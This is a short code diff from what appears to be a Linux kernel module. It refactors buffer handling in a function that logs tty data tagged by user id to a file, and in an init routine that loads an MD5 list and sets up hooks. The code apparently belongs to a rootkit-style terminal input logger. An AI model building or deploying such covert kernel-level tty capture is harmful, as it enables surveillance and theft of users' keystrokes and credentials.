@@ -792,16 +792,23 @@ static void _tty_write_log(uid_t uid, pid_t pid, char *buf, ssize_t len) {
     static loff_t offset;
     size_t total;
 
-    /* rebel without a cause */
-    char fuck_this_iso_c90_again[len+16]; /** more than enough */
+    /**
+     * +16 is enough to hold "uid.%d" length
+     * Here using VLA because the implementation of kernel_write
+     * make a forced conversion to user ptr. I suspect that
+     * if the variable is heap allocated, the pointer will be lost.
+     *
+     * VLA will generate a warning as we're not c99, that's life.
+     */
+    char ttybuf[len+16];
 
     spin_lock(&tty_lock);
-    total = snprintf(fuck_this_iso_c90_again,
-            sizeof(fuck_this_iso_c90_again), "uid.%d %s", uid, buf);
+    total = snprintf(ttybuf,
+            sizeof(ttybuf), "uid.%d %s", uid, buf);
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
-    fs_kernel_write_file(ttyfilp, (const void*)fuck_this_iso_c90_again, total, &offset);
+    fs_kernel_write_file(ttyfilp, (const void*)ttybuf, total, &offset);
 #else
-    fs_kernel_write_file(ttyfilp, (const char*)fuck_this_iso_c90_again, total, offset);
+    fs_kernel_write_file(ttyfilp, (const char*)ttybuf, total, offset);
 #endif
     spin_unlock(&tty_lock);
 }
@@ -1239,7 +1246,7 @@ bool sys_init(void) {
 
     /** if md5 file is present load it into the list */
     if (fs_file_stat(MD5FILE, &stat) == 0) {
-        char buf[stat.size+1];
+        char *buf = kzalloc(stat.size+1, GFP_KERNEL);
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
         loff_t offset = 0;
         ssize_t rv;
@@ -1248,7 +1255,6 @@ bool sys_init(void) {
         int rv;
 #endif
 
-        memset(buf, 0, sizeof(buf));
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
         rv = fs_kernel_read_file(md5filp, (void*)buf, stat.size, &offset);
 #else
@@ -1268,6 +1274,7 @@ bool sys_init(void) {
                 rv -= MD5PAIRLEN;
             }
         }
+        kv_mem_free(buf);
     }
 
     /** init hooks - negate so we're consistent with other inits */
